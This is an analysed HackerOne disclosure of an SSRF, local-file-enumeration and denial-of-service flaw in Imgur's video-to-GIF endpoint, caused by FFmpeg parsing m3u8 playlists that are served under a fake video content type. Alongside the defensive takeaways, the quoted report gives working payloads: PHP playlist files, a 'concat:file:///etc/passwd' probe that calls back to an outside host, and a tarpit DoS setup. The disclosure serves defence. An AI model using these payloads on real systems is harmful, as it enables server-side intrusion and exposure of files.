# SSRF / Local File Enumeration / DoS via Improper FFmpeg Playlist Handling in Imgur Video-to-GIF Service

## Metadata
- **Source:** HackerOne
- **Report:** 115978 | https://hackerone.com/reports/115978
- **Submitted:** 2016-02-11
- **Reporter:** aesteral
- **Program:** Imgur
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Server-Side Request Forgery (SSRF), Local File Enumeration, Denial of Service, Information Disclosure, Improper Input Validation
- **CVEs:** None
- **Category:** web-api

## Summary
Imgur's video-to-GIF conversion endpoint is vulnerable to SSRF because FFmpeg processes playlist formats (m3u8) regardless of Content-Type headers, allowing attackers to make arbitrary HTTP requests from Imgur servers and enumerate local files. The vulnerability stems from a mismatch between Imgur's Content-Type validation and FFmpeg's format parsing, which ignores declared types and processes playlist directives that trigger external resource fetching.

## Attack scenario
1. Attacker creates a PHP endpoint serving a file with video/avi Content-Type header but m3u8 playlist content
2. Attacker submits the malicious URL to Imgur's vidgif/upload endpoint via POST request with start/stop timestamps
3. Imgur's servers perform HEAD request and validate Content-Type as video/avi, passing validation
4. Imgur downloads the file via GET request and passes it to FFmpeg for processing
5. FFmpeg ignores the video/avi Content-Type and parses the m3u8 playlist directives, making HTTP requests to attacker-controlled URLs or local file:// paths
6. Attacker receives requests from Imgur servers (SSRF) or infers file existence through timing/concat directives (file enumeration)

## Root cause
Imgur relies solely on Content-Type headers for file validation but FFmpeg's m3u8 parser ignores Content-Type and parses playlist syntax regardless. FFmpeg also supports special directives like concat: that can reference local files (file://) and external URLs, enabling both SSRF and local file enumeration without proper sandboxing or additional validation of processed files.

## Attacker mindset
Exploit the gap between application-level validation (Content-Type) and library-level parsing (FFmpeg format detection). Use FFmpeg's built-in playlist features (m3u8 with concat directives) to achieve multiple attack goals: probe internal networks via SSRF, enumerate sensitive files via error-based inference, and exhaust resources through infinite redirect loops and timeouts.

## Defensive takeaways
- Never rely solely on Content-Type headers for file validation; perform magic byte/signature verification on actual file content
- Implement strict parsing configuration for third-party libraries (e.g., disable playlist/protocol support in FFmpeg if not required)
- Use file:// protocol blocklisting in user-supplied URLs and within processed media files to prevent local file access
- Sandbox FFmpeg execution with network isolation (e.g., no external HTTP/HTTPS access) or whitelist-only external resources
- Implement timeouts and rate limits on FFmpeg processing to mitigate DoS via resource exhaustion
- Validate and sanitize all data extracted from user-supplied files before using it in further processing
- Add egress filtering and HTTP request logging to detect unauthorized outbound connections from media processing services

## Variant hunting
Search for similar vulnerabilities in other services using FFmpeg or similar media libraries with playlist support (HLS/DASH/m3u8). Check ImageMagick, LibVLC, GStreamer, and custom video conversion services. Look for improper validation of Content-Type vs actual format parsing in any media processing pipeline. Test other playlist formats (DASH .mpd, .m3u) and other FFmpeg protocol handlers (rtmp://, rtsp://, gopher://, etc.) that may bypass content validation.

## MITRE ATT&CK
- T1190
- T1057
- T1526
- T1005
- T1498
- T1021

## Notes
Report demonstrates chained vulnerabilities: Content-Type bypass + SSRF + file enumeration + DoS. The concat: directive with file:// prefix is particularly powerful for local file enumeration without direct error messages. FFmpeg version information (Lavf/55.48.100) was disclosed in User-Agent, aiding further exploitation. The vulnerability required no authentication and could be triggered by any user with access to the video-to-GIF service. Demonstrates importance of understanding third-party library capabilities and limitations of surface-level validation mechanisms.

## Full report
<details><summary>Expand</summary>

Hello!

Short description
========

https://imgur.com/vidgif/upload endpoint is vulnerable to a SSRF/LFE vulnerability which allows an attacker to craft connections originating from imgur servers to any destination on the internet and imgur internal network and disclose lists of files located on imgur servers including sensitive data.

Why does the vulnerability exist?
========

imgur allows users to use 'video-to-gif' service. When a user requests conversion of such a video, imgur's servers perform an HTTP HEAD request to a user-supplied URL in order to discover the URL-s content-type and length. After that a user is offered a option to choose the required timestamps for beginning and end of converted video and then imgur performs another HTTP request (GET) to the same video file in order to grab the video file. After imgur downloads the video it evidently performs some sort of operations with ffmpeg (libav). However, ffmpeg has support of several special kinds of files which are not video files but 'playlists'. When processing such playlists ffmpeg performs commands contained and makes HTTP requests to urls listed in such playlists. We will use HTTP Live Streaming playlists (m3u8) in this example.

Although imgur verifies content-types to ignore files which are not actually videos, ffmpeg does not care about such types and will parse a, say, video/avi files with m3u8 lines as a m3u8 file.

Exploits
========
Basic SSRF exploit
--------------
To launch a basic SSRF we will prepare a php file which replies with video/avi content-type and m3u8 actual content. When parsing such a file, ffmpeg will make an unwanted HTTP GET request to an attacker-supplied URL.

First, lets prepare a POST-dispatcher page:

Request: http://gradeco.ru/imgur/m3u8-dispatch.html

```
<form action="https://imgur.com/vidgif/upload" method="post">
<input type="hidden" name="source" value="http://gradeco.ru/imgur/m3u8.php" />
<input type="hidden" name="url" value="http://gradeco.ru/imgur/m3u8.php" />
<input type="hidden" name="start" value="0.1" />
<input type="hidden" name="stop" value="1.0" />
<input type="submit" />
</form>
```

Now, lets prepare a 'video file' with the payload, we use php to supply a fake content-type

Request: http://gradeco.ru/imgur/m3u8.php

```
<?php
        header('Content-type: video/avi');
        header('Content-Length: 1234'); // random content-length, imgur fails if none provided
?>
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://www.gradeco.ru:12346/BASICSSRF // ffmpeg on imgur side will make this request
#EXT-X-ENDLIST
```

After ffmpeg parses the m3u8.php file imgur's server makes a request to an attacker's server:

```
evil.com:# nc -v -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
Connection from [54.82.61.224] port 12346 [tcp/*] accepted (family 2, sport 44251)
GET /BASICSSRF HTTP/1.1
User-Agent: Lavf/55.48.100
Accept: */*
Connection: close
Host: www.gradeco.ru:12346
```

We can see our SSRF identification token ('BASICSSRF') present and some information disclosure - lavf version 55.48.100.

Simple local file enumeration exploit
---------

As we can only perform HTTP GET-s with this vulnerability we have to somehow procure more information. Fortunately, ffmpeg m3u8 support provides us with a useful CONCAT command which allows us to concatenate multiple sources. It also fails if source is not present.

To utilize that lets prepare a new m3u8-2.php file:

```
<?php
        header('content-type: video/avi');
        header('content-length: 1234');
?>
#EXTM3U
#EXT-X-PLAYLIST-TYPE:VOD
#EXT-X-TARGETDURATION:1
#EXT-X-VERSION:3
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:file:///etc/passwd|http://gradeco.ru:12346/
#EXT-X-ENDLIST
```

If provided with this file, imgur's server will contact gradeco.ru:12346 in case if /etc/passwd exists and won't if it does not exist. In this way an attacker may easily enumerate files.

Denial of service exploit:
-------
To perform a denial of service attack an attacker may prepare a specially crafted YUV4 file which will hang ffmpeg and keep it on constantly performing HTTP GET requests. To do so lets create a separate file with a correct m3u8 header:

http://gradeco.ru/imgur/m3u8-head.m3u8

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://gradeco.ru:12346/?.txt
```

and a 'video file' 

http://gradeco.ru/imgur/m3u8-dos.php

```
<?php
        header('Content-type: video/avi');
        header('Content-length: 1');
?>
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://www.gradeco.ru/imgur/m3u8-head.m3u8?2|file:///etc/issue
#EXT-X-ENDLIST
```

Redirect port 12346 to TARPIT and then request conversion by sending a following post request:

```
source: http://gradeco.ru/imgur/m3u8-dos.php
start: 0.1
stop: 10
```

imgur service will request port 12346, end up in TARPIT and then wait forever for 10 seconds of video to be delivered. That means that it will have an open socket and open process which may lead to resource exhaustion.



</details>

---
*Analysed by Claude on 2026-05-24*
